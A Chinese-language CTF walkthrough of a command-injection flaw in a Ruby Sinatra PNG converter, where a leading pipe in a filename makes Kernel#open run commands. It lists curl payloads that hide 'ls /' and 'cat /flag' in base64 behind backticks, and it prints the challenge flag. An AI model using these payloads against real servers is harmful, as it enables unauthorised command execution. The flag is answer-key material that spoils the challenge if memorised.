---
layout: null
---

### 题目名称：PNG图片转换器

题目来源：CTFHub（原题：2021-第五空间智能安全大赛-Web）

题目类别：Web

题目描述：

```ruby
require 'sinatra'
require 'digest'
require 'base64'

get '/' do
  open("./view/index.html", 'r').read()
end

get '/upload' do
  open("./view/upload.html", 'r').read()
end

post '/upload' do
  unless params[:file] && params[:file][:tempfile] && params[:file][:filename] && params[:file][:filename].split('.')[-1] == 'png'
    return "<script>alert('error');location.href='/upload';</script>"
  end
  begin
    filename = Digest::MD5.hexdigest(Time.now.to_i.to_s + params[:file][:filename]) + '.png'
    open(filename, 'wb') { |f|
      f.write open(params[:file][:tempfile],'r').read()
    }
    "Upload success, file stored at #{filename}"
  rescue
    'something wrong'
  end

end

get '/convert' do
  open("./view/convert.html", 'r').read()
end

post '/convert' do
  begin
    unless params['file']
      return "<script>alert('error');location.href='/convert';</script>"
    end

    file = params['file']
    unless file.index('..') == nil && file.index('/') == nil && file =~ /^(.+)\.png$/
      return "<script>alert('dont hack me');</script>"
    end
    res = open(file, 'r').read()
    headers 'Content-Type' => "text/html; charset=utf-8"
    "var img = document.createElement(\"img\");\nimg.src= \"data:image/png;base64," + Base64.encode64(res).gsub(/\s*/, '') + "\";\n"
  rescue
    'something wrong'
  end
end
```

附件：[Ch-file-wp02.rb](Ch-file-wp02.rb)

### 解题思路

题目给了一份 app.rb，是一个用 Sinatra 写的 Ruby 小程序：可以做首页、上传 PNG、以及把 PNG 转换成 base64 显示。

根据dsh的提示，关键在 /convert 这个 POST 路由：它先做三道检查——文件名里不能有 ..、不能有 /、必须以 .png 结尾——通过之后就用 open(file, 'r') 去读文件，再把读到的内容 base64 编码返回。

问题出在 Ruby 的 open 上：如果传给 open 的字符串以管道符 | 开头，它不会去读文件，而是把后面的内容当成命令去执行。所以只要让 file 的值以 | 开头，再让整串以 .png 收尾骗过正则，就能在服务器上执行任意命令。又因为 / 被过滤，命令里只要带路径，就得先 base64 编码藏起来，配合反引号在命令里解码，这就是常说的"管道符与反引号配合"。

### 详细步骤

1. 拿到题目给的 app.rb，通读源码，定位到 POST /convert 路由

2. 分析这一段的逻辑：三道检查之后执行 open(file, 'r').read()

    unless file.index('..') == nil && file.index('/') == nil && file =~ /^(.+)\.png$/
      return "<script>alert('dont hack me');</script>"
    end
    res = open(file, 'r').read()

3. 想清楚绕过点：Ruby 的 open 支持管道符，只要值以 | 开头就会执行命令；而三道检查里只有"必须以 .png 结尾"需要骗，办法是让命令末尾接一个重定向，比如 >2.png

4. 先探路，看当前目录有什么

    POST /convert
    file=|ls||echo${IFS}>2.png

    实际敲的命令（单引号不能省，否则 ${IFS} 会被本地 shell 展开）：

    curl -X POST --data-urlencode 'file=|ls||echo${IFS}>2.png' http://靶场地址/convert

    返回里能看到 app.rb、view 目录，以及两个上传过的 png，没有 flag.php

5. 再看根目录找 flag 文件（命令里的 / 要藏起来，所以用 base64）

    cat /flag_30490 的 base64 是 Y2F0IC9mbGFnXzMwNDkw

    POST /convert
    file=|`echo "bHMgLw==" | base64 -d`||echo${IFS}>2.png

    实际敲的命令：

    curl -X POST --data-urlencode 'file=|`echo "bHMgLw==" | base64 -d`||echo${IFS}>2.png' http://靶场地址/convert

    返回里看到根目录下有一个 flag_30490

6. 直接把它读出来

    POST /convert
    file=|`echo "Y2F0IC9mbGFnXzMwNDkw" | base64 -d`||echo${IFS}>2.png

    实际敲的命令：

    curl -X POST --data-urlencode 'file=|`echo "Y2F0IC9mbGFnXzMwNDkw" | base64 -d`||echo${IFS}>2.png' http://靶场地址/convert

7. 响应是一段 JS，里面的 data:image/png;base64, 后面那串就是文件内容被 base64 之后的结果

8. 把响应那段 base64 解码，获得flag。

### Payload

file=|`echo "Y2F0IC9mbGFnXzMwNDkw" | base64 -d`||echo${IFS}>2.png

实际发送：

curl -X POST --data-urlencode 'file=|`echo "Y2F0IC9mbGFnXzMwNDkw" | base64 -d`||echo${IFS}>2.png' http://靶场地址/convert

### flag

ctfhub{495402a295e64e154691dcdf}

### 总结&反思

本次我首次见到 .rb 文件，也对 Web 渗透的流程有了初步认识。
